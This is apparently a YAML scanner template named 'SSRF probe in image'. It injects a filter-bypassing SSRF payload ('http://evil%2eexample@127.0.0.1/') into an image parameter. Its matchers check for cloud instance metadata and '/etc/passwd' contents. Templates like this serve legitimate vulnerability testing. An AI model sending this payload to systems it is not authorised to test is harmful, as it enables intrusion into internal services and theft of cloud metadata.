id: ssrf5-0356
name: 'SSRF probe in image'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via image (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      image:
        - 'http://evil%2eexample@127.0.0.1/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
